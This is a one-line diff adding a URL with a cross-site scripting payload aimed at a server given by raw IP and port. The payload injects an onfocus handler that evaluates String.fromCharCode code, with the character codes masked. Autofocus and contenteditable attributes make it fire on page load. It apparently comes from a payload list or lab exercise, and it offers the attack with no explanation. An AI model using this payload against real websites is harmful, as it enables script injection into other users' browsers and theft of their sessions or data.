@@ -1,0 +1,1 @@
+http://52.52.236.217:16401/?tag=pattrs=onfocus%3Deval(String.fromCharCode(xxxxxxxxxxx))%2526tabindex=0%2526contenteditable=true%2526style=-webkit-user-modify:read-write%2526autofocus=true%2526id=xss#xss
